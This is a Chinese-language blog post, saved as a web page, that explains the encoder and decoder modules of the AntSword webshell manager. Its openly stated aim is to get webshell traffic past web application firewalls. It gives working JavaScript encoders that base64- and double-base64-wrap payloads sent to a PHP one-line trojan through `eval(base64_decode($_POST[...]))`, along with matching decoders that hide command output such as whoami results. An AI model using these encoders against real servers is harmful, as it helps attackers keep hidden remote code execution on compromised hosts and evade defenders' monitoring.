@@ -1,0 +1,393 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
+        <title>中国蚁剑的编码和解码模块 | 小C♥天天</title>
+        <meta name="author" content="小C&天天">
+        <meta name="description" content="^v^">
+        <meta name="keywords" content="">
+        <link rel="icon" href="/images/icon.jpg">
+        <script src="https://cdn.staticfile.org/instant.page/5.1.0/instantpage.min.js" type="module"></script>
+        <script src="https://cdn.staticfile.org/font-awesome/6.1.1/js/all.min.js"></script>
+        <link rel="stylesheet" href="/css/fonts.min.css">
+        <link rel="stylesheet" href="/css/particlex.css">
+        <link rel="stylesheet" href="/css/main.css">
+        <script src="https://cdn.staticfile.org/vue/3.2.33/vue.global.prod.min.js"></script>
+        <script src="https://cdn.staticfile.org/pixi.js/4.6.1/pixi.min.js"></script>
+    <meta name="generator" content="Hexo 6.2.0"></head>
+    <body>
+        <div id="loading" style="height:100vh;width:100vw;position:fixed;display:flex;z-index:200;justify-content:space-between;background:#fff;transition:opacity 0.3s ease-out"><div style="position:fixed;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center"><div id="loadcontent" style="width:30vmin;height:30vmin;padding:60px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px #dd20dd;text-align:center"><div><h2>LOADING...</h2><p style="word-break:keep-all">正在加载</p><div><img alt="loading" src="/images/afde9fa65a5742a90b51d6e1211e841e.gif"></div></div></div></div></div>
+        <div id="layout">
+            <i data-fa-symbol="calendar-solid" class="fa-solid fa-calendar fa-fw"></i>
+            <i data-fa-symbol="bookmark-solid" class="fa-solid fa-bookmark fa-fw"></i>
+            <i data-fa-symbol="tags-solid" class="fa-solid fa-tags fa-fw"></i>
+            <transition name="into">
+                <div v-show="show_page" style="display: -not-none">
+                    <div id="menu_show">
+                         
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">小C♥天天</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;主页</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;关于</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;文章</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;分类</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;标签</span>
+        </a>
+        
+    </div>
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div class="curtain" @click="menu_show = !menu_show" v-show="menu_show"></div>
+        <div :class="'title'" @click="menu_show = !menu_show">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;小C♥天天</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">主页</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">关于</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">文章</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">分类</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">标签</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+                    </div>
+                    <div id="main">
+                        
+<div class="article">
+    <div>
+        <h1>中国蚁剑的编码和解码模块 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2022/12/9
+        </span>
+        
+        <span class="category">
+            <a href="/categories/工具使用">
+                <span class="icon">
+                    <svg class="fa-icon"><use xlink:href="#bookmark-solid"></use></svg>
+                </span>
+                工具使用
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#tags-solid"></use></svg>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/工具" style="color: #ffa2c4">
+                    工具
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/中国蚁剑" style="color: #00bcd4">
+                    中国蚁剑
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    <div class="content" v-pre>
+        <h1 id="壹-前言"><a href="#壹-前言" class="headerlink" title="壹 前言"></a>壹 前言</h1><p>之前一直不知道蚁剑的编码器和解码器有什么用，后来看一篇文章，才知道，原来可以通过对蚁剑的编码器和解码器对webshell进行改造过WAF，然后就开始找各种资料学习，下面是对这两个模块学习的心得！</p>
+<span id="more"></span>
+<h1 id="贰-编码模块"><a href="#贰-编码模块" class="headerlink" title="贰 编码模块"></a>贰 编码模块</h1><p>以蚁剑的base64编码器为例子。创建一个base64模块：<br><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/4b8a5a0573950babdd78c740eca9f2cc.png" alt="4b8a5a0573950babdd78c740eca9f2cc.png"></p>
+<pre><code>/**
+ * php::base64编码器
+ * Create at: 2022/07/10 22:27:09
+ */
+
+&#39;use strict&#39;;
+
+/*
+* @param  &#123;String&#125; pwd   连接密码
+* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组
+* @return &#123;Array&#125;  data  编码器处理后的 payload 数组
+*/
+module.exports = (pwd, data, ext=&#123;&#125;) =&gt; &#123;
+  // ##########    请在下方编写你自己的代码   ###################
+  // 以下代码为 PHP Base64 样例
+
+  // 生成一个随机变量名
+  let randomID = `_0x$&#123;Math.random().toString(16).substr(2)&#125;`;
+  // 原有的 payload 在 data[&#39;_&#39;]中
+  // 取出来之后，转为 base64 编码并放入 randomID key 下
+  data[randomID] = Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);
+
+  // shell 在接收到 payload 后，先处理 pwd 参数下的内容，
+  data[pwd] = `eval(base64_decode($_POST[$&#123;randomID&#125;]));`;
+
+  // ##########    请在上方编写你自己的代码   ###################
+
+  // 删除 _ 原有的payload
+  delete `data[&#39;_&#39;];`
+  // 返回编码器处理后的 payload 数组
+  return data;
+&#125;
+</code></pre>
+<p>这是蚁剑的base64编码的默认代码，我们使用简单的PHP一句话木马通过刚刚创建的编码器进行连接，并抓包效果如下：<br><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/ae6cd5886241f381ff834a2d2acb17e1.png" alt="ae6cd5886241f381ff834a2d2acb17e1.png"><br>可以发现，数据包分为两部分，一部分是随机变量（例子中的<code>_0xb928a21aee0de</code>），另一部分是木马的密码（例子中的<code>cmd</code>），在刚刚创建的编码器中模板已经说明了，二个传递参数和返回值的作用，我们来具体分析：</p>
+<pre><code class="javascript">let randomID = `_0x$&#123;Math.random().toString(16).substr(2)&#125;`;
+</code></pre>
+<p>这一段是生成一个随机的变量名，也就是例子中的<code>_0xb928a21aee0de</code>，存在<code>randomID</code>这个变量里</p>
+<pre><code class="javascript">data[randomID] = Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);
+</code></pre>
+<p>这一段是对<code>data[&#39;_&#39;]</code>，也就是<code>payload</code>进行<code>base64</code>编码，并存在<code>data</code>这个数组的<code>randomID</code>键值里，（JS是弱语言，所以可以随便加键值对）</p>
+<pre><code class="javascript">data[pwd] = `eval(base64_decode($_POST[$&#123;randomID&#125;]));`;
+</code></pre>
+<p>这一段则是对<code>randomID</code>这个随机变量存储的<code>payload</code>进行<code>base64</code>解码，并执行新的一句话，并存储在<code>data[pwd]</code>中。</p>
+<p>其实蚁剑最后会将<code>data[&#39;_&#39;];</code>参数进行删除，就算在编码器内不删除，在蚁剑的源码内也会将<code>data[&#39;_&#39;];</code>进行删除操作，即在<code>source\core\base.js</code>内可以看到：<br><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/6d7047b177da209a5a4b461dbb35cd9d.png" alt="6d7047b177da209a5a4b461dbb35cd9d.png"><br>最后蚁剑都会执行<code>data[pwd]</code>的内容，所以关键就在<code>data[pwd]</code>这个键值对。当蚁剑传输给被控主机时，实际上是套娃，将<code>data[pwd]</code>传给服务端的一句话木马中，服务端的一句话木马执行蚁剑传过来的<code>base64</code>一句话木马，当执行完base64一句话木马后才是真正的<code>payload</code>。所以由于套娃，传入的是两部分参数，接着我们可以对其进行简单的双重<code>base64</code>编码，并且值设置一个参数。</p>
+<p>如果我们只传一个参数，那么就需要在木马本身进行加密改造，也就是说取消了对<code>payload</code>的解码，让木马自身携带解码功能，即我们在木马上进行两次<code>base64</code>解码：<br><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/ee5a05d016d6b76bce57504163b1d4e1.png" alt="ee5a05d016d6b76bce57504163b1d4e1.png"><br>然后修改编码器，：</p>
+<pre><code class="javascript">/**
+ * php::base64编码器
+ * Create at: 2022/07/10 22:27:09
+ */
+
+&#39;use strict&#39;;
+
+/*
+* @param  &#123;String&#125; pwd   连接密码
+* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组
+* @return &#123;Array&#125;  data  编码器处理后的 payload 数组
+*/
+module.exports = (pwd, data, ext=&#123;&#125;) =&gt; &#123;
+  // ##########    请在下方编写你自己的代码   ###################
+  // 由于我们希望蚁剑传递的参数不需要解密，所以不用设置随机变量名，我们直接将编码后的payload赋值到data[pwd]中，就不需要进行随机变量名这个键值对了，注意我们是进行两次base64加密
+  data[&#39;_&#39;] = Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);
+  data[pwd] = Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);
+
+  // ##########    请在上方编写你自己的代码   ###################
+
+  // 删除 _ 原有的payload
+  delete data[&#39;_&#39;];
+  // 返回编码器处理后的 payload 数组
+  return data;
+&#125;
+</code></pre>
+<p>可以看到进行了两次的<code>base64</code>编码：<br><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/f3a8ae83e9f33c714702717ae580cb59.png" alt="f3a8ae83e9f33c714702717ae580cb59.png"></p>
+<h1 id="叁-解码模块"><a href="#叁-解码模块" class="headerlink" title="叁 解码模块"></a>叁 解码模块</h1><p><font color="red">需要注意编码模块和解码模块是分离开的，编码模块是执行命令到服务器上，防止WAF检测到恶意payload，但是执行完的信息在服务器上是明文的，而解码模块是将明文的信息进行编码传到蚁剑过程中防止WAF检测到敏感数据而进行的模块。并不是说需要用编码器将payload进行编码到了服务器上解码器进行解码。</font></p>
+<p>在返回参数信息时，WAF检测流量会追踪一些敏感信息，例如<code>whoami</code>、内网IP等，这是我们可以对返回的敏感信息进行编码，传给蚁剑的时候进行解码。以base64解码器为例子：<br><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/4161d54b241504061b70d0c6eede4a07.png" alt="4161d54b241504061b70d0c6eede4a07.png"></p>
+<pre><code class="javascript">/**
+ * php::base64解码器
+ * Create at: 2022/07/10 23:21:01
+ */
+
+&#39;use strict&#39;;
+
+module.exports = &#123;
+  /**
+   * @returns &#123;string&#125; asenc 将返回数据base64编码
+   * 自定义输出函数名称必须为 asenc
+   * 该函数使用的语法需要和shell保持一致
+   */
+  asoutput: () =&gt; &#123;
+    return `function asenc($out)&#123;
+      return @base64_encode($out);
+    &#125;
+    `.replace(/\n\s+/g, &#39;&#39;);
+  &#125;,
+  /**
+   * 解码 Buffer
+   * @param &#123;string&#125; data 要被解码的 Buffer
+   * @returns &#123;string&#125; 解码后的 Buffer
+   */
+  decode_buff: (data, ext=&#123;&#125;) =&gt; &#123;
+    return Buffer.from(data.toString(), &#39;base64&#39;);
+  &#125;
+&#125;
+</code></pre>
+<p>还是先抓包：<br><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/1ef691ce771facf047538404927cd65e.png" alt="1ef691ce771facf047538404927cd65e.png"><br>可以看见返回的信息在<code>burp</code>上是<code>base64</code>的，而在蚁剑的终端上明文的，而且与编码器没有任何关系。接着我们具体分析以下解码模块的代码。</p>
+<pre><code class="javascript">asoutput: () =&gt; &#123;
+return `function asenc($out)&#123;
+  return @base64_encode($out);
+&#125;
+`.replace(/\n\s+/g, &#39;&#39;);
+&#125;,
+</code></pre>
+<p>这一部分是蚁剑的<code>payload</code>的返回值部分（关于蚁剑的<code>payload</code>这里不具体说明），我们需要关注的是<code>return @base64_encode($out);</code>这一部分，可以看到对返回蚁剑终端的信息进行了<code>base64</code>编码。</p>
+<pre><code class="javascript">decode_buff: (data, ext=&#123;&#125;) =&gt; &#123;
+    return Buffer.from(data.toString(), &#39;base64&#39;);
+&#125;
+</code></pre>
+<p>这一部分是在蚁剑的终端对返回的数据进行<code>base64</code>解码，假设我们将<code>data.toString()</code>直接返回，可以发现，终端是对信息进行了<code>base64</code>输出的：<br><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/73788db460306a1d16125551c26afdfb.png" alt="73788db460306a1d16125551c26afdfb.png"><br><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/09e37486913d3c1c1803975d29e53894.png" alt="09e37486913d3c1c1803975d29e53894.png"><br>所以老样子，根据原理我们可以设置双重<code>base64</code>解码器，编码器代码：</p>
+<pre><code class="javascript">/**
+ * php::base64解码器
+ * Create at: 2022/07/10 23:21:01
+ */
+
+&#39;use strict&#39;;
+
+module.exports = &#123;
+  /**
+   * @returns &#123;string&#125; asenc 将返回数据base64编码
+   * 自定义输出函数名称必须为 asenc
+   * 该函数使用的语法需要和shell保持一致
+   */
+  asoutput: () =&gt; &#123;
+    return `function asenc($out)&#123;
+      return @base64_encode(base64_encode($out));
+    &#125;
+    `.replace(/\n\s+/g, &#39;&#39;);
+  &#125;,
+  /**
+   * 解码 Buffer
+   * @param &#123;string&#125; data 要被解码的 Buffer
+   * @returns &#123;string&#125; 解码后的 Buffer
+   */
+  decode_buff: (data, ext=&#123;&#125;) =&gt; &#123;
+    let top1 = Buffer.from(data.toString(), &#39;base64&#39;);
+    return Buffer.from(top1.toString(), &#39;base64&#39;);
+  &#125;
+&#125;
+</code></pre>
+<p>将<code>asoutput</code>部分进行了双重<code>base64</code>编码，而<code>decode_buff</code>进行了双重<code>base64</code>解码，最后效果如下：<br><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/adfe88107ccbeabcd52e411d697f42d0.png" alt="adfe88107ccbeabcd52e411d697f42d0.png"></p>
+<h1 id="肆-参考"><a href="#肆-参考" class="headerlink" title="肆 参考"></a>肆 参考</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7735">蚁剑改造过WAF系列（一）</a></li>
+<li><a target="_blank" rel="noopener" href="https://copyfuture.com/blogs-details/20201121192322049y5l48y8g19oqp83">蚁剑原理与魔改</a></li>
+</ul>
+
+    </div>
+    
+</div>
+                         
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2022 - 2022 小C♥天天
+            <span class="footer-icon">
+                <i class="fa-brands fa-github fa-fw"></i>
+            </span>
+            @小C&天天
+        </div>
+        <div>
+            备案号：小C&天天の窝
+        </div>
+    </div>
+</footer>
+                    </div>
+                </div>
+            </transition>
+            <div id="img_show">
+                <img id="img_content" alt="img_show">
+            </div>
+        </div>
+        <script src="https://cdn.staticfile.org/highlight.js/11.5.1/highlight.min.js"></script>
+        <script src="/js/particlex.js"></script>
+        <script src="/js/showimg.js"></script>
+        
+
+        <!-- 3D模型 -->
+        <div id="L2dCanvas" style="position: relative;"></div>
+        <script src="/js/live2d.min.js"></script>
+        <script src="/css/live2d.css"></script>
+        <script>
+            var v = new Viewer({
+                basePath: "/model",
+                role: "zhala_2",
+                mobile: true,
+            });
+        </script>
+        <!-- 点击 -->
+        <script>
+            let body = document.getElementsByTagName('body')[0];
+            body.addEventListener('click', (e) => {
+                let contentArr = ['✊','😘','😍','😊','😭','😡','😋','👍','🐷','😱','💷','💵','×','🆗','№','⭐','🌙','♥','💴','☀','🐎','🐂','🐏','√'];
+                let randomNum = function (n) {
+                    return Math.floor(Math.random() * n)
+                }
+                let span = document.createElement('span');
+                span.innerHTML = `${contentArr[randomNum(contentArr.length)]}`;
+                span.style.color = `rgb(${randomNum(256)},${randomNum(256)},${randomNum(256)})`;
+                span.style.position = 'absolute';
+                span.style.top = `${e.pageY}px`;
+                span.style.left = `${e.pageX}px`;
+                span.style.transition = 'all 1s ease';
+                span.style.zIndex = 20000;
+                body.appendChild(span)
+                setTimeout(()=>{
+                    span.style.top = span.offsetTop - 100 + 'px';
+                    span.style.opacity = 0;
+                    setTimeout(()=>{span.remove()},700)
+                },0)
+            })
+        </script>
+        <!-- 流星背景特效 -->
+        <canvas id="background" style="position:fixed;top:0;left:0;width:100vw;height:100vh;pointer-events:none;z-index:-1"></canvas>
+        <script src="/js/background.js"></script>
+    </body>
+</html>
